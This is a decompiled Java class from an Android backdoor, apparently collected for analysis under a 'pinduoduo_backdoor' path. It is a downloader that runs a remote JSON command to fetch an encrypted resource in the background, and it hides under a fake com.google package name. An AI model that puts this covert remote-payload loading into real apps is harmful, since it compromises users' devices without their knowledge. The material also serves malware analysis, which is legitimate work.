package com.google.android.sd.biz_dynamic_dex.download;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.c;
import com.google.android.sd.utils.DataUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import org.json.JSONArray;
import org.json.JSONObject;

public class DownloadExecutor extends DynamicCmdExecutor {
  public void realExecute(Context paramContext, String paramString) {
    try {
      if (TextUtils.isEmpty(paramString))
        return; 
      "inputs:".concat(String.valueOf(paramString));
      c.b();
      a a = new a(paramContext);
      try {
        if (TextUtils.isEmpty(paramString)) {
          a.a("empty_param", null);
          return;
        } 
        Context context = a.i;
        try {
          a.a = DataUtils.getString("com.google.android.sd.d_e_d_br", "");
          a.b = DataUtils.getLong("com.google.android.sd.d_e_g_br", -1L);
          a.c = DataUtils.getString("com.google.android.sd.d_e_h_br", "");
          StringBuilder stringBuilder2 = new StringBuilder();
          stringBuilder2.append(context.getFilesDir());
          stringBuilder2.append("/99099.dat");
          a.d = new File(stringBuilder2.toString());
          StringBuilder stringBuilder1 = new StringBuilder("aesKey: ");
          stringBuilder1.append(a.a);
          stringBuilder1.append(" size: ");
          stringBuilder1.append(a.b);
          stringBuilder1.append(" md5: ");
          stringBuilder1.append(a.c);
          stringBuilder1.append(" tempFile: ");
          stringBuilder1.append(a.d.exists());
          c.b();
        } catch (Exception exception) {
          (new StringBuilder("initFromCache error")).append(exception.getMessage());
          c.b();
        } 
        JSONArray jSONArray = (new JSONObject(paramString)).optJSONArray("download_resource");
        if (jSONArray == null || jSONArray.length() == 0) {
          a.a("array_null", null);
          return;
        } 
        boolean bool2 = false;
        JSONObject jSONObject = jSONArray.getJSONObject(0);
        if (jSONObject == null) {
          a.a("info_null", null);
          return;
        } 
        c.b();
        a.e = jSONObject.optInt("retry_time", 5);
        a.h = jSONObject.optInt("track_cmd", 303);
        a.f = TextUtils.equals("1", jSONObject.optString("clear_when_fail", "1"));
        a.g = TextUtils.equals("1", jSONObject.optString("limit_speed", "1"));
        (new StringBuilder("limitSpeed: ")).append(a.g);
        c.b();
        (new StringBuilder("retryMaxTimes: ")).append(a.e);
        c.b();
        (new StringBuilder("clearWhenFail: ")).append(a.f);
        c.b();
        (new StringBuilder("trackCmd: ")).append(a.h);
        c.b();
        String str1 = jSONObject.optString("file_size");
        String str2 = jSONObject.optString("file_md5");
        String str3 = jSONObject.optString("download_url");
        "download_url".concat(String.valueOf(str3));
        c.b();
        boolean bool1 = bool2;
        if (a.d.exists()) {
          bool1 = bool2;
          if (!TextUtils.isEmpty(a.a))
            bool1 = true; 
        } 
        if (bool1) {
          c.b();
          if (!TextUtils.equals(String.valueOf(a.b), str1) || !TextUtils.equals(a.c, str2)) {
            a.a();
          } else {
            a.a("continue_work", null);
            Utils.runInNewThread((Runnable)new Object(a, str3));
          } 
        } 
        a.b = a.a(str1);
        a.c = str2;
        DataUtils.setLong("com.google.android.sd.d_e_g_br", a.b);
        DataUtils.setString("com.google.android.sd.d_e_h_br", a.c);
        StringBuilder stringBuilder = new StringBuilder("aesKey: ");
        stringBuilder.append(a.a);
        stringBuilder.append(" size: ");
        stringBuilder.append(a.b);
        stringBuilder.append(" md5: ");
        stringBuilder.append(a.c);
        stringBuilder.append(" tempFile: ");
        stringBuilder.append(a.d.exists());
        c.b();
        Utils.runInNewThread((Runnable)new Object(a, str3));
      } catch (Exception exception) {
        StringBuilder stringBuilder = new StringBuilder("executor_work_error_");
        stringBuilder.append(exception.getMessage());
        a.a(stringBuilder.toString(), null);
        return;
      } 
    } catch (Exception exception) {
      (new StringBuilder("error:")).append(exception.getMessage());
      c.b();
      return;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\download\DownloadExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */